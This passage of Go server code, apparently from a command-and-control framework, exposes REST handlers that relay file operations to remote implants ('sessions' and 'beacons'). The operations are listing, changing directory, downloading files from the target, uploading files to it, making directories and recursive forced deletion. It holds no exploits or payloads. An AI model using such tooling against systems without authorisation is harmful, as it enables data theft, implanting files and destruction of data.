	rel := strings.TrimPrefix(r.URL.Path, "/api/v1/artifacts/")
	rel = strings.TrimPrefix(rel, "/")
	if rel == "" {
		writeError(w, http.StatusBadRequest, "artifact path required")
		return
	}
	target := filepath.Clean(filepath.Join(s.artifactDir, rel))
	if !strings.HasPrefix(target, filepath.Clean(s.artifactDir)+string(filepath.Separator)) {
		writeError(w, http.StatusForbidden, "artifact not accessible")
		return
	}
	info, err := os.Stat(target)
	if err != nil {
		if os.IsNotExist(err) {
			writeError(w, http.StatusNotFound, "artifact not found")
		} else {
			writeError(w, http.StatusInternalServerError, "unable to read artifact")
		}
		return
	}
	if info.IsDir() {
		writeError(w, http.StatusBadRequest, "artifact is a directory")
		return
	}
	w.Header().Del("Content-Type")
	http.ServeFile(w, r, target)
}

// ──────────────────────────────────────────────────────────────
// Sprint 9 — File Operations (ls, cd, pwd, download, upload, mkdir, rm)
// ──────────────────────────────────────────────────────────────

const fileOpTimeout = 30 * time.Second
const fileOpHardLimit = 60 * time.Second

// --- Session (synchronous) handlers ---

func handleFileLsSession(w http.ResponseWriter, r *http.Request) {
	session := sessionAlive(w, mux.Vars(r)["id"])
	if session == nil {
		return
	}
	var body struct {
		Path string `json:"path"`
	}
	json.NewDecoder(r.Body).Decode(&body)

	req := &konjiyamipb.LsReq{
		Path:    body.Path,
		Request: &commonpb.Request{Timeout: int64(fileOpTimeout)},
	}
	reqData, _ := proto.Marshal(req)
	respData, err := requestWithTimeout(session, konjiyamipb.MsgLsReq, fileOpTimeout, fileOpHardLimit, reqData)
	if err != nil {
		writeError(w, http.StatusRequestTimeout, err.Error())
		return
	}
	var resp konjiyamipb.Ls
	if err := proto.Unmarshal(respData, &resp); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to parse ls response")
		return
	}
	files := make([]map[string]any, 0, len(resp.Files))
	for _, f := range resp.Files {
		files = append(files, map[string]any{
			"name":    f.Name,
			"isDir":   f.IsDir,
			"size":    f.Size,
			"modTime": f.ModTime,
			"mode":    f.Mode,
			"link":    f.Link,
		})
	}
	path := resp.Path
	if path == "" {
		path = body.Path
	}
	writeJSON(w, http.StatusOK, map[string]any{
		"path":   path,
		"exists": resp.Exists,
		"files":  files,
	})
}

func handleFileCdSession(w http.ResponseWriter, r *http.Request) {
	session := sessionAlive(w, mux.Vars(r)["id"])
	if session == nil {
		return
	}
	var body struct {
		Path string `json:"path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Path == "" {
		writeError(w, http.StatusBadRequest, "path is required")
		return
	}
	req := &konjiyamipb.CdReq{
		Path:    body.Path,
		Request: &commonpb.Request{Timeout: int64(fileOpTimeout)},
	}
	reqData, _ := proto.Marshal(req)
	respData, err := requestWithTimeout(session, konjiyamipb.MsgCdReq, fileOpTimeout, fileOpHardLimit, reqData)
	if err != nil {
		writeError(w, http.StatusRequestTimeout, err.Error())
		return
	}
	var resp konjiyamipb.Pwd
	if err := proto.Unmarshal(respData, &resp); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to parse cd response")
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"path": resp.Path})
}

func handleFilePwdSession(w http.ResponseWriter, r *http.Request) {
	session := sessionAlive(w, mux.Vars(r)["id"])
	if session == nil {
		return
	}
	req := &konjiyamipb.PwdReq{
		Request: &commonpb.Request{Timeout: int64(fileOpTimeout)},
	}
	reqData, _ := proto.Marshal(req)
	respData, err := requestWithTimeout(session, konjiyamipb.MsgPwdReq, fileOpTimeout, fileOpHardLimit, reqData)
	if err != nil {
		writeError(w, http.StatusRequestTimeout, err.Error())
		return
	}
	var resp konjiyamipb.Pwd
	proto.Unmarshal(respData, &resp)
	writeJSON(w, http.StatusOK, map[string]any{"path": resp.Path})
}

func handleFileDownloadSession(w http.ResponseWriter, r *http.Request) {
	session := sessionAlive(w, mux.Vars(r)["id"])
	if session == nil {
		return
	}
	var body struct {
		Path string `json:"path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Path == "" {
		writeError(w, http.StatusBadRequest, "path is required")
		return
	}
	req := &konjiyamipb.DownloadReq{
		Path:    body.Path,
		Request: &commonpb.Request{Timeout: int64(fileOpTimeout)},
	}
	reqData, _ := proto.Marshal(req)
	respData, err := requestWithTimeout(session, konjiyamipb.MsgDownloadReq, fileOpTimeout, fileOpHardLimit, reqData)
	if err != nil {
		writeError(w, http.StatusRequestTimeout, err.Error())
		return
	}
	var resp konjiyamipb.Download
	if err := proto.Unmarshal(respData, &resp); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to parse download response")
		return
	}
	if !resp.Exists {
		writeError(w, http.StatusNotFound, "file not found on target")
		return
	}
	fname := filepath.Base(body.Path)
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, fname))
	w.Header().Set("Content-Length", strconv.Itoa(len(resp.Data)))
	w.WriteHeader(http.StatusOK)
	w.Write(resp.Data)
}

func handleFileUploadSession(w http.ResponseWriter, r *http.Request) {
	session := sessionAlive(w, mux.Vars(r)["id"])
	if session == nil {
		return
	}
	if err := r.ParseMultipartForm(64 << 20); err != nil {
		writeError(w, http.StatusBadRequest, "invalid multipart form")
		return
	}
	destPath := r.FormValue("path")
	if destPath == "" {
		writeError(w, http.StatusBadRequest, "path is required")
		return
	}
	file, _, err := r.FormFile("file")
	if err != nil {
		writeError(w, http.StatusBadRequest, "file is required")
		return
	}
	defer file.Close()
	data, err := io.ReadAll(file)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to read upload")
		return
	}
	req := &konjiyamipb.UploadReq{
		Path:    destPath,
		Data:    data,
		Encoder: "raw",
		Request: &commonpb.Request{Timeout: int64(fileOpTimeout)},
	}
	reqData, _ := proto.Marshal(req)
	respData, err := requestWithTimeout(session, konjiyamipb.MsgUploadReq, fileOpTimeout, fileOpHardLimit, reqData)
	if err != nil {
		writeError(w, http.StatusRequestTimeout, err.Error())
		return
	}
	var resp konjiyamipb.Upload
	proto.Unmarshal(respData, &resp)
	writeJSON(w, http.StatusOK, map[string]any{"path": resp.Path, "size": len(data)})
}

func handleFileMkdirSession(w http.ResponseWriter, r *http.Request) {
	session := sessionAlive(w, mux.Vars(r)["id"])
	if session == nil {
		return
	}
	var body struct {
		Path string `json:"path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Path == "" {
		writeError(w, http.StatusBadRequest, "path is required")
		return
	}
	req := &konjiyamipb.MkdirReq{
		Path:    body.Path,
		Request: &commonpb.Request{Timeout: int64(fileOpTimeout)},
	}
	reqData, _ := proto.Marshal(req)
	respData, err := requestWithTimeout(session, konjiyamipb.MsgMkdirReq, fileOpTimeout, fileOpHardLimit, reqData)
	if err != nil {
		writeError(w, http.StatusRequestTimeout, err.Error())
		return
	}
	var resp konjiyamipb.Mkdir
	proto.Unmarshal(respData, &resp)
	writeJSON(w, http.StatusOK, map[string]any{"path": resp.Path})
}

func handleFileRmSession(w http.ResponseWriter, r *http.Request) {
	session := sessionAlive(w, mux.Vars(r)["id"])
	if session == nil {
		return
	}
	var body struct {
		Path      string `json:"path"`
		Recursive bool   `json:"recursive"`
		Force     bool   `json:"force"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Path == "" {
		writeError(w, http.StatusBadRequest, "path is required")
		return
	}
	req := &konjiyamipb.RmReq{
		Path:      body.Path,
		Recursive: body.Recursive,
		Force:     body.Force,
		Request:   &commonpb.Request{Timeout: int64(fileOpTimeout)},
	}
	reqData, _ := proto.Marshal(req)
	respData, err := requestWithTimeout(session, konjiyamipb.MsgRmReq, fileOpTimeout, fileOpHardLimit, reqData)
	if err != nil {
		writeError(w, http.StatusRequestTimeout, err.Error())
		return
	}
	var resp konjiyamipb.Rm
	proto.Unmarshal(respData, &resp)
	writeJSON(w, http.StatusOK, map[string]any{"path": resp.Path})
}

// --- Beacon (async task) handlers ---

func fileBeaconTask(w http.ResponseWriter, beaconID string, msgType uint32, reqData []byte, description string) {
	beacon, err := db.BeaconByID(beaconID)
	if err != nil {
		writeError(w, http.StatusNotFound, "beacon not found")
		return
	}
	task, err := beacon.Task(&konjiyamipb.Envelope{
		Type: msgType,
		Data: reqData,
	})
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to create task")
		return
	}
	task.Description = description
	if err := db.Session().Save(task).Error; err != nil {
		writeError(w, http.StatusInternalServerError, "failed to save task")
		return
	}
	writeJSON(w, http.StatusCreated, beaconTaskToDTO(task, false))
}

func handleFileLsBeacon(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	var body struct {
		Path string `json:"path"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	req := &konjiyamipb.LsReq{Path: body.Path, Request: &commonpb.Request{}}
	reqData, _ := proto.Marshal(req)
	fileBeaconTask(w, id, konjiyamipb.MsgLsReq, reqData, fmt.Sprintf("ls %s", body.Path))
}

func handleFileCdBeacon(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	var body struct {
		Path string `json:"path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Path == "" {
		writeError(w, http.StatusBadRequest, "path is required")
		return
	}
	req := &konjiyamipb.CdReq{Path: body.Path, Request: &commonpb.Request{}}
	reqData, _ := proto.Marshal(req)
	fileBeaconTask(w, id, konjiyamipb.MsgCdReq, reqData, fmt.Sprintf("cd %s", body.Path))
}

func handleFilePwdBeacon(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	req := &konjiyamipb.PwdReq{Request: &commonpb.Request{}}
	reqData, _ := proto.Marshal(req)
	fileBeaconTask(w, id, konjiyamipb.MsgPwdReq, reqData, "pwd")
}

func handleFileDownloadBeacon(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	var body struct {
		Path string `json:"path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Path == "" {
		writeError(w, http.StatusBadRequest, "path is required")
		return
	}
	req := &konjiyamipb.DownloadReq{Path: body.Path, Request: &commonpb.Request{}}
	reqData, _ := proto.Marshal(req)
	fileBeaconTask(w, id, konjiyamipb.MsgDownloadReq, reqData, fmt.Sprintf("download %s", body.Path))
}

func handleFileUploadBeacon(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	if err := r.ParseMultipartForm(64 << 20); err != nil {
		writeError(w, http.StatusBadRequest, "invalid multipart form")
		return
	}
	destPath := r.FormValue("path")
	if destPath == "" {
		writeError(w, http.StatusBadRequest, "path is required")
		return
	}
	file, _, err := r.FormFile("file")
	if err != nil {
		writeError(w, http.StatusBadRequest, "file is required")
		return
	}
	defer file.Close()
	data, err := io.ReadAll(file)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to read upload")
		return
	}
	beacon, err := db.BeaconByID(id)
	if err != nil {
		writeError(w, http.StatusNotFound, "beacon not found")
		return
	}
	req := &konjiyamipb.UploadReq{Path: destPath, Data: data, Encoder: "raw", Request: &commonpb.Request{}}
	reqData, _ := proto.Marshal(req)
	task, err := beacon.Task(&konjiyamipb.Envelope{Type: konjiyamipb.MsgUploadReq, Data: reqData})
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to create task")
		return
	}
	task.Description = fmt.Sprintf("upload %s (%d bytes)", destPath, len(data))
	if err := db.Session().Save(task).Error; err != nil {
		writeError(w, http.StatusInternalServerError, "failed to save task")
		return
	}
	writeJSON(w, http.StatusCreated, beaconTaskToDTO(task, false))
}

func handleFileMkdirBeacon(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	var body struct {
		Path string `json:"path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Path == "" {
		writeError(w, http.StatusBadRequest, "path is required")
		return
	}
	req := &konjiyamipb.MkdirReq{Path: body.Path, Request: &commonpb.Request{}}
	reqData, _ := proto.Marshal(req)
	fileBeaconTask(w, id, konjiyamipb.MsgMkdirReq, reqData, fmt.Sprintf("mkdir %s", body.Path))
}

func handleFileRmBeacon(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	var body struct {
		Path      string `json:"path"`
		Recursive bool   `json:"recursive"`
		Force     bool   `json:"force"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Path == "" {
		writeError(w, http.StatusBadRequest, "path is required")
		return
	}
	req := &konjiyamipb.RmReq{Path: body.Path, Recursive: body.Recursive, Force: body.Force, Request: &commonpb.Request{}}
	reqData, _ := proto.Marshal(req)
	fileBeaconTask(w, id, konjiyamipb.MsgRmReq, reqData, fmt.Sprintf("rm %s", body.Path))
}
